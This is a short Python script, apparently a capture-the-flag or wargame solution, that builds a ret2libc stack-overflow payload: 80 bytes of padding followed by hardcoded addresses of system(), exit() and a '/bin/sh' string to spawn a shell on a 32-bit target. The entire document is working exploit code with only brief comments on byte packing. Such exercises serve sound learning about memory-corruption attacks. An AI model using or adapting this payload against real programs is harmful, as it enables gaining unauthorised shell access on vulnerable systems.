
import struct

# < little endian format
# I : unsigned int  4 bytes

system_address=struct.pack('<I', 0xb7ecffb0)


bin_sh_address=struct.pack('<I',0xbffff9ce-48)

exit_address=struct.pack('<I',0xb7ec60c0)

padding=b'A'*80

payload = padding + system_address + exit_address + bin_sh_address




